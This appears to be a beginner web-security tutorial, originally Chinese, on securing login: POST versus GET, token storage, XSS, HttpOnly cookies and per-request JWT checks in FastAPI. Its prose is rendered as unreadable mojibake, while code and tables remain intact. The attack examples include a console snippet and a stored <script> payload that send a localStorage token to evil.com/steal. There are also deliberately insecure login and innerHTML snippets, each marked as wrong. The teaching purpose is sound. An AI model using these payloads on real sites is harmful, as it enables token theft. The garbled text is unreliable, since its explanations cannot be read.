# ğŸ›¡ï¸ ä½ åªæ˜¯åœ¨å¯«ç™»å…¥ã€ä¸Šå‚³åœ–ç‰‡ã€æŸ¥è³‡æ–™ï¼Œç‚ºä»€éº¼ç¶²ç«™å»è¢«æ”»æ“Šäº†ï¼Ÿ

---

## âœï¸ å‰è¨€

ä½ å¯«äº†ä¸€å€‹ç™»å…¥é ï¼Œä¸€å€‹å•†å“å¾Œå°ï¼Œä¸€å€‹æŸ¥åœ–ç‰‡çš„åŠŸèƒ½ï¼Œæ„Ÿè¦ºéƒ½æ²’ä»€éº¼å•é¡Œã€‚
ä½†ä½ æ‰“é–‹ F12ï¼Œé§­å®¢ä¹Ÿæ‰“é–‹äº†ï¼›ä½ æŒ‰ä¸‹ç™»å…¥ï¼Œä»–ä¹Ÿè·Ÿè‘—æ‰“äº† APIã€‚
ä½ ç”šè‡³é‚„æ²’ç™¼ç¾ä½ ç”¨çš„åœ–åºŠçˆ†æµé‡ã€API è¢«æ‰“çˆ†ã€å¸³è™Ÿè¢«ç›œå…‰ã€‚

é€™ç¯‡æ–‡ç« ä¸è¬›æŠ½è±¡åè©ï¼Œåªå¾ä½ æœƒåšçš„ 3 å€‹æ“ä½œå‡ºç™¼ï¼š
**ç™»å…¥ã€ä¸Šå‚³å•†å“ã€æŸ¥åœ–ç‰‡ã€‚**
ç”¨ä¸€å€‹ä¸€å€‹ä½ æœƒå¯«çš„åŠŸèƒ½ï¼Œå¸¶ä½ çœ‹é§­å®¢æœƒæ€éº¼æ”»æ“Šï¼Œè€Œä½ åˆè©²æ€éº¼é˜²å®ˆã€‚
å…¨ç¯‡åŒ…å«æ”»é˜²æ•…äº‹ã€F12 åœ–è§£ã€å®Œæ•´ JS + Python ç¨‹å¼ç¢¼ã€èˆ‡æ¯å±¤é˜²å®ˆå¯¦ä½œå»ºè­°ã€‚
çœ‹å®Œé€™ç¯‡ï¼Œå³ä½¿ä½ ä¸æ˜¯è³‡å®‰å°ˆå®¶ï¼Œä¹Ÿèƒ½å¯«å‡ºä¸å®¹æ˜“è¢«æ‰“çˆ†çš„ç¶²ç«™ã€‚

---

## ğŸ§­ å¤§ç¶± 

### 1ï¸âƒ£ ç™»å…¥ï¼ˆLoginï¼‰

* å¸³å¯†æ€éº¼é€æ‰å®‰å…¨ï¼ŸGET / POST / HTTPS
* token è¦å­˜å“ªè£¡æ‰ä¸æœƒè¢«å·ï¼Ÿ
* console / XSS æ€éº¼å·èµ° tokenï¼ŸHttpOnly èƒ½ä¸èƒ½æ“‹ï¼Ÿ
* ç™»å‡ºå¾Œé‚„èƒ½æ‰“ APIï¼Ÿtoken æ²’é©—è­‰å°±æ˜¯æ¼æ´
* å„ç¨®å„²å­˜æ–¹å¼ï¼ˆlocalStorageã€sessionStorageã€cookieï¼‰ç”Ÿå‘½é€±æœŸèˆ‡é¢¨éšª

---

### 2ï¸âƒ£ æ–°å»ºå•†å“ï¼ˆCreate Productï¼‰

* è¡¨å–®é©—è­‰å¯«åœ¨å‰ç«¯ï¼Ÿconsole ç›´æ¥é€ å‡é€å‡º
* åŠŸèƒ½æŒ‰éˆ•éš±è—èµ·ä¾†æ²’ç”¨ï¼ŒDevTools ä¸€ç§’åŸ·è¡Œ
* å•†å“èªªæ˜å¯è¼¸å…¥ scriptï¼ŸXSS æ”»æ“Šç¤ºç¯„
* ä¸Šå‚³åœ–ç‰‡ä¸è™•ç†ï¼Œèƒ½è¢«æƒ¡æ„æª”æ¡ˆæå´©ï¼Ÿ
* API token å¦‚æœå¯«åœ¨å‰ç«¯æœƒæ€æ¨£ï¼Ÿæ‰“çˆ†å¾Œç›´æ¥ç ´ç”¢

---

### 3ï¸âƒ£ æŸ¥è©¢åœ–ç‰‡ / æŸ¥è³‡æ–™ï¼ˆView Resourceï¼‰

* API æ²’åšèº«ä»½é©—è­‰ï¼Œèª°éƒ½èƒ½çœ‹èª°çš„åœ–ç‰‡ï¼Ÿ
* åœ–ç‰‡é€£çµæ˜¯æ˜ç¢¼ï¼Ÿçˆ¬èŸ²ä¸€è¼ªå°±è¢«æ‰’å…‰
* å›å‚³è³‡æ–™å¤ªå¤šï¼ŒæŠŠ storage keyã€user email å…¨é€å‡ºï¼Ÿ
* ä½ çŸ¥é“å“ªäº›è³‡æ–™ç®—æ©Ÿæ•è³‡è¨Šå—ï¼Ÿ

---

### ğŸ“ è£œå……ç¯‡ï¼ˆè¦–æƒ…æ³åŠ åœ¨æ¯ç« æœ«æˆ–é›†ä¸­æ”¾æ–‡æœ«ï¼‰

* localStorage vs sessionStorage vs cookie vs HttpOnly å°ç…§è¡¨
* JWTã€token éæœŸã€æ’¤éŠ·èˆ‡åˆ·æ–°æ©Ÿåˆ¶æ¦‚å¿µ
* F12/console å¯ä»¥çœ‹è¦‹ä»€éº¼ã€åšä»€éº¼ã€æ€éº¼å·ï¼Ÿ
* ä»€éº¼å«ã€Œæ©Ÿæ•è³‡æ–™ã€ï¼Ÿå‰ç«¯å›å‚³æ‡‰è©²é®æ‰ä»€éº¼æ¬„ä½ï¼Ÿ
* åœ–åºŠå®‰å…¨ï¼šURL ç°½åã€proxyã€å¾Œç«¯ relay è¨­è¨ˆ
 
---

# 1ï¸âƒ£ ç™»å…¥ï¼ˆLoginï¼‰

ä½ å¯«äº†ä¸€å€‹ç™»å…¥é ï¼Œä½¿ç”¨è€…è¼¸å…¥å¸³å¯†æŒ‰ä¸‹ã€Œç™»å…¥ã€ï¼Œç™¼å‡ºä¸€å€‹è«‹æ±‚åˆ°å¾Œç«¯ï¼Œæ‹¿åˆ° tokenï¼Œç„¶å¾Œé–‹å§‹ä¸²æ¥å¾Œå°åŠŸèƒ½ã€‚

çœ‹èµ·ä¾†ä¸€åˆ‡æ­£å¸¸ã€‚
ä½†å¾ä½ æ‰“é–‹ F12 çš„é‚£ä¸€åˆ»ï¼Œé§­å®¢ä¹Ÿè·Ÿè‘—é–‹å§‹è¡Œå‹•äº†ã€‚

è¦è®“è«‹æ±‚å®‰å…¨çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š
* ç™»å…¥å¾Œçš„è«‹æ±‚ï¼Œéƒ½è¦ç¶“étokené©—è­‰

1. è«‹æ±‚çš„æ©Ÿæ•å…§å®¹ä¸è¦é¡¯ç¤ºåœ¨ç¶²å€åˆ—
2. è«‹æ±‚æ™‚è¦å¸¶é©—è­‰éçš„tokenï¼Œä¸¦åœ¨å¾Œç«¯é©—è­‰æ˜¯é©—è­‰éçš„ç„¡èª¤
3. é©—è­‰éçš„tokenç®—æ©Ÿæ•è³‡æ–™ï¼Œè¦å­˜æ”¾åœ¨å®‰å…¨çš„åœ°æ–¹ã€‚
4. token æ‡‰è©²è¦æœ‰æ™‚æ•ˆæ€§
5. è«‹æ±‚çš„æ©Ÿæ•å…§å®¹ä¸è¦è®“ JS è®€åˆ°ï¼ˆç€è¦½å™¨ä¸­çš„consoleï¼‰


---

## ğŸ”» 1.1 ä½ æœƒæ€éº¼å¯«ç™»å…¥åŠŸèƒ½ï¼Ÿ

å‰ç«¯ç¨‹å¼ç¢¼ï¼ˆä¸å®‰å…¨ç¯„ä¾‹ï¼‰ï¼š

```js
// âŒ ç”¨ GET å‚³å¸³å¯†
fetch("https://example.com/login?username=alice&password=123456")
  .then((res) => res.json())
  .then(console.log);
```

å¾Œç«¯ç¨‹å¼ç¢¼ï¼ˆPython + FastAPIï¼‰ï¼š

```python
@app.get("/login")
def login(username: str, password: str):
    if username == "alice" and password == "123456":
        return {"token": "my-secret-token"}
    return {"error": "Invalid credentials"}
```

ä½ æ‹¿åˆ° token å¾Œæ‰“ç®—é€™æ¨£ç”¨ï¼š

```js
localStorage.setItem("token", "my-secret-token"); // âŒ
```

çœ‹ä¼¼ç°¡å–®ï¼Œå»ç•™ä¸‹è¶…å¤šç ´å£ã€‚

---

## ğŸ§¨ 1.2 é§­å®¢æ€éº¼æ‰“ä½ ï¼Ÿï¼ˆæ”»é˜²èµ·æ‰‹å¼ï¼‰

### æ”»æ“Š 1ï¼šF12 â†’ Network â†’ çœ‹å¾—åˆ°å¸³å¯†

ç•¶ä½ ç”¨ GET å‚³å¸³å¯†æ™‚ï¼ŒURL æœƒåƒé€™æ¨£ï¼š

```
GET /login?username=alice&password=123456
```

ä»»ä½•äººæ‰“é–‹ F12 â†’ Network â†’ é»è©²è«‹æ±‚ï¼Œå°±èƒ½çœ‹åˆ°ï¼š

* Request URLï¼ˆå«å¸³å¯†ï¼‰
* Query String Parametersï¼ˆå¸³å¯†åˆ†é–‹é¡¯ç¤ºï¼‰

é€™äº›å¸³å¯†å¯èƒ½æœƒï¼š

* è¢«è¨˜éŒ„åœ¨ browser history
* è¢« proxy/server log ç´€éŒ„
* è¢«æƒ¡æ„å·¥å…·æ“·å–

ğŸ”´ **åªè¦æœ‰äººèƒ½çœ‹ä½ çš„é›»è…¦ç•«é¢ï¼Œå¸³å¯†å°±æš´éœ²äº†ã€‚**

âœ… è§£æ³•ï¼šè«‹æ±‚æ‡‰ä½¿ç”¨ `POST`ï¼Œä¸¦é…åˆ `HTTPS` å‚³è¼¸ï¼Œå¸³å¯†æ”¹æ”¾åœ¨ request bodyï¼Œä¸å†å‡ºç¾åœ¨ URLã€‚

---

### æ”»æ“Š 2ï¼šä½ æ”¾åœ¨ localStorage çš„ tokenï¼Œä»–ä¹Ÿèƒ½å·

ä½ ä»¥ç‚º token å­˜åœ¨ localStorage å°±è¬ç„¡ä¸€å¤±ï¼Ÿå…¶å¯¦ï¼š

```js
// åªè¦é–‹ F12ã€åœ¨ console è¼¸å…¥ï¼š
fetch("https://evil.com/steal", {
  method: "POST",
  body: localStorage.getItem("token")
});
```

é€™å°±æ˜¯ Self-XSSï¼šé§­å®¢å¯ä»¥èª˜å°ä½ ã€Œè²¼ä¸ŠæŸæ®µç¨‹å¼ç¢¼ã€ï¼Œä½ å°±æŠŠ token å‚³çµ¦ä»–äº†ã€‚

ä½†é‚„æœ‰æ›´ææ€–çš„ï¼š

```html
<!-- å‡è¨­ä½ æœ‰ç•™è¨€æ¬„ï¼Œæ”»æ“Šè€…è¼¸å…¥é€™æ®µå…§å®¹ï¼š -->
<script>
  fetch("https://evil.com/steal", {
    method: "POST",
    body: localStorage.getItem("token")
  });
</script>
```

å¦‚æœä½ æ²’ escape é€™æ®µ HTMLï¼Œç„¶å¾Œç”¨ innerHTML é¡¯ç¤ºç•™è¨€ï¼š

```js
document.getElementById("comments").innerHTML = comment.content; // âŒ
```

æ‰€æœ‰æ‰“é–‹é é¢çš„äººï¼Œtoken å°±è‡ªå‹•è¢«å·äº†ã€‚é€™å°±æ˜¯ Stored XSSï¼ˆå„²å­˜å‹è·¨ç«™æ”»æ“Šï¼‰ã€‚

| é¡å‹         | ç™¼å‹•æ–¹å¼                   | è¢«å®³å°è±¡ | å±éšªç¨‹åº¦    |
| ---------- | ---------------------- | ---- | ------- |
| Self-XSS   | ä½¿ç”¨è€…è‡ªå·±è²¼å…¥ console        | è‡ªå·±   | ä¸­ï¼ˆéœ€èª˜å°ï¼‰  |
| Stored XSS | æ”»æ“Šè€…è¼¸å…¥ `<script>` å­˜å…¥è³‡æ–™åº« | æ‰€æœ‰è¨ªå®¢ | é«˜ï¼ˆè‡ªå‹•è§¸ç™¼ï¼‰ |

âœ… è§£æ³•ï¼š

* ä½¿ç”¨ HttpOnly cookieï¼Œè®“ JS è®€ä¸åˆ° token
* æ‰€æœ‰ user input é¡¯ç¤ºå‰å¿…é ˆ escapeï¼ˆæˆ–ç”¨ textContentï¼‰
* å‰ç«¯ç¦ç”¨ innerHTML æ’å…¥ user content

---

## âœ… 1.3 ä½ è©²æ€éº¼é˜²å®ˆï¼Ÿç¬¬ä¸€æ­¥æ˜¯æ”¹å¯«è«‹æ±‚æ–¹å¼

### æ”¹ç”¨ POST å‚³å¸³å¯† + HTTPS åŠ å¯†

```js
await fetch("https://example.com/login", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({ username: "alice", password: "123456" }),
});
```

å¾Œç«¯ï¼ˆFastAPIï¼‰ï¼š

```python
class LoginRequest(BaseModel):
    username: str
    password: str

@app.post("/login")
def login(data: LoginRequest):
    return {"token": create_jwt_token(data.username)}
```

ğŸ” ä½¿ç”¨ `HTTPS` + `POST`ï¼Œå¸³å¯†å¾ URL éš±è— â†’ body å‚³é€ â†’ åŠ å¯†å‚³è¼¸ â†’ ä¸ç•™ç—•è·¡ã€‚

---

## ğŸ§± 1.4 å‡ç´šé˜²å®ˆï¼štoken è¦å­˜å“ªè£¡æ‰å®‰å…¨ï¼Ÿ

| å„²å­˜æ–¹å¼             | JS å¯è®€ï¼Ÿ | é—œæ‰åˆ†é æœƒæ¶ˆå¤±ï¼Ÿ | é—œæ‰ç€è¦½å™¨æœƒæ¶ˆå¤±ï¼Ÿ | é¢¨éšª                     |
| ---------------- | ------ | -------- | --------- | ---------------------- |
| `localStorage`   | âœ…      | âŒ        | âŒ         | XSS, console å¯å·        |
| `sessionStorage` | âœ…      | âœ…        | âœ…         | æ˜“ä¸Ÿå¤±ï¼Œä»å¯è¢«å·               |
| Cookie           | âœ…      | âŒ        | âŒï¼ˆå¯è¨­ï¼‰     | æ˜“è¢« JS æŠ“åˆ°ï¼ˆé™¤éè¨­ HttpOnlyï¼‰ |
| HttpOnly Cookie  | âŒ      | âŒ        | âŒï¼ˆå¯è¨­ï¼‰     | âœ… JS ç„¡æ³•è®€ï¼Œæ¨è–¦ç”¨æ³•          |

âœ… çµè«–ï¼šä½¿ç”¨ **HttpOnly Cookie** æ­é… `secure + samesite=strict` ç‚ºæœ€ä½³å¯¦å‹™ã€‚

---

## ğŸ§° 1.5 å»ºè­°åšæ³•ï¼šä½¿ç”¨ HttpOnly Cookie å„²å­˜ç™»å…¥ç‹€æ…‹

å¾Œç«¯ï¼ˆFastAPIï¼‰ï¼š

```python
@app.post("/login")
def login(data: LoginRequest, response: Response):
    token = create_jwt_token(data.username)
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True, # âœ… JavaScript ç„¡æ³•è®€å–
        samesite="Strict", # âœ… é˜²ç¦¦ CSRF
        secure=True,  # âœ… åƒ…åœ¨ HTTPS ä¸‹å‚³è¼¸ (é–‹ç™¼æ™‚è‹¥ç„¡ HTTPS å¯å…ˆ False)
        max_age=3600,  # cookie æœ‰æ•ˆæœŸ
    )
    return {"msg": "ç™»å…¥æˆåŠŸ"}
```

å‰ç«¯åªè¦ï¼š

```js
fetch("/api/user", {
  method: "GET",
  credentials: "include",
});
```

---

## ğŸ§¨ 1.6 é§­å®¢ç¬¬äºŒæ³¢æ”»æ“Šï¼šç™»å…¥å¾Œä¸é©—è­‰ tokenï¼Œä¸€æ¨£èƒ½æ‰“ API

æƒ…å¢ƒï¼š

* ä½¿ç”¨è€…ç™»å…¥å¾Œæ‹¿åˆ° token
* F12 â†’ Network â†’ è¤‡è£½å®Œæ•´ request
* ç™»å‡ºã€æ›è£ç½®ã€ç„¡ç—•è¦–çª—ã€Postman è²¼ä¸Šå°±èƒ½é‡é€è«‹æ±‚

è‹¥å¾Œç«¯æ²’é©—è­‰ tokenï¼ˆæ²’æª¢æŸ¥æ˜¯å¦å­˜åœ¨ã€æ˜¯å¦éæœŸã€æ˜¯å¦ç‚ºæœ¬äººï¼‰ï¼Œ
**é€™äº›è«‹æ±‚ç…§æ¨£é€šéã€‚**

---

## âœ… 1.7 æ¯å€‹ API éƒ½è¦é©—è­‰èº«ä»½

å¾Œç«¯éœ€é‡å°æ¯ç­† request é©—è­‰èº«ä»½ï¼š

```python
from fastapi import Request, HTTPException, Depends

def get_current_user(request: Request):
    token = request.cookies.get("access_token")
    if not token:
        raise HTTPException(status_code=401)
    return decode_jwt(token)
```

æ‡‰ç”¨ï¼š

```python
@app.get("/me")
def get_profile(user=Depends(get_current_user)):
    return {"username": user.username}
```

---

## âœ… å°çµï¼šç™»å…¥æ“ä½œä¸­ä½ å¯èƒ½æœƒçŠ¯çš„è³‡å®‰éŒ¯èª¤

| éŒ¯èª¤åšæ³•                 | å¾Œæœ        | ä¿®æ­£æ–¹å¼              |
| -------------------- | --------- | ----------------- |
| GET å‚³å¸³å¯†              | è¢«å·å…‰       | æ”¹ POST + HTTPS    |
| token å­˜ localStorage | è¢«å· + æ°¸ä¸éæœŸ | æ”¹ HttpOnly cookie |
| ä¸é©—è­‰ API token        | ç™»å‡ºä¹Ÿèƒ½æ“ä½œ    | æ¯æ¬¡è«‹æ±‚éƒ½é©—è­‰ token     |
| token ç„¡éæœŸæ©Ÿåˆ¶          | è¢«å·å¾Œæ°¸ä¹…å¯ç”¨   | åŠ ä¸Š JWT éæœŸèˆ‡æ’¤éŠ·      |

---

âœ… ä¸‹ä¸€ç« æˆ‘å€‘å°‡é€²å…¥ç¬¬äºŒå€‹æ“ä½œï¼šã€Œæ–°å»ºå•†å“ã€ï¼Œä½ å°‡çœ‹åˆ°æ€æ¨£ä¸€å€‹ DevTools å°±èƒ½è®“ä»»ä½•ä½¿ç”¨è€…å‡è£è‡ªå·±æ˜¯ç®¡ç†å“¡ä¸Šå‚³è³‡æ–™ï¼Œä¸¦é€é XSS æ”»æ“Šæ•´å€‹ç¶²ç«™ã€‚
